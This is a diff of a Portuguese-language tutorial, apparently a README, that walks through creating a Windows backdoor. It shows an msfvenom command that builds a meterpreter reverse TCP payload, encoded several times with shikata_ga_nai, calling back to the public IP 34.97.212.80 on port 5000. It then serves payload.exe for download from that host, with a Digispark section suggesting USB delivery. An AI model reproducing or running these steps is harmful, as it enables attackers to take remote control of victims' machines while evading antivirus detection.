@@ -50,7 +50,7 @@ Como vai ser a primeira execução ele vai perguntar se você deseja criar um no
 Agora vamos criar o backdoor definindo qual tipo de conexão iremos usar que vai ser uma REVERSA TCP para qual tipo de SO, qual vai ser o nosso LHOST(IP de comunicação) nossa LPORT(porta de comunicação) o tipo da extenção do backdoor -f exe o algoritmo de criptografia e compreensão, -i o numero de interações do encoded com o backdoor, -o o nosso arquivo de saida.  se você estive e uma cloud provavelmente vai ter que criar uma regra de firewall para a sua porta escolhida
 
  ```shell
-        $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=34.97.212.80 LPORT=5000 -f exe -e x86/shikata_ga_nai -i 5 -o payload.exe
+ msfvenom -p windows/meterpreter/reverse_tcp LHOST=34.97.212.80 LPORT=5000 -f exe -e x86/shikata_ga_nai -i 5 -o payload.exe
 ```
 
 Rodando um ls verá que o arquivo payload.exe foi criado
@@ -65,7 +65,7 @@ Vamos criar uma copia dele dentro da nossa pasta do servidor
 
 Feito isso nosso arquivo vai esta disponivel para download em 
 
-        http://34.97.212.80/payload.exe
+http://34.97.212.80/payload.exe
 
 
 **Digispark**
